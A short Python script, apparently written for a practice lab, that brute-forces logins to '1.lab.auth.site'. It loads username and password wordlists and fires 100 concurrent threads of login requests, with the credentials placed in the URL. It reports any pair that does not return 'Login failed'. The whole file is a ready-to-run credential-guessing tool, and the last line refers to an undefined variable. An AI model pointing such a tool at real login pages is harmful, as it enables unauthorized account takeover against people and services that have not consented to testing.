#!/usr/bin/env python3
# Does need a 'names.txt' and a 'password.txt' file

import requests
import concurrent.futures

names = []
password = []


with open('names.txt','r') as f:
	for line in f:
		names.append(line.strip())

with open('password.txt','r') as p:
	for line in p:
		password.append(line.strip())

def makeReq(name='',password='',method=0):
	r = requests.get(f"http://1.lab.auth.site/ajax.php?fun=login&username={name}&password={password}")

	if r.text.find("Login failed ") == -1 :
		print(f"Found username: {name} and Password: {password} code: {r.text.find('invalid')}")

def passguess(rname): # THIS ONE THING FIXES A PROBLEM I ALMOST KILLED MYSELF OVER
	for line in password:
		makeReq(name=rname,password=line)


with concurrent.futures.ThreadPoolExecutor(100) as executor:  # THIS TOOK ME HOURS.
	results = executor.map(passguess,names)

print(f"Querys made:{Query}")

# https://www.youtube.com/watch?v=IEEhzQoKtQU - Threading


#ps dont forget to unblock john hammound.
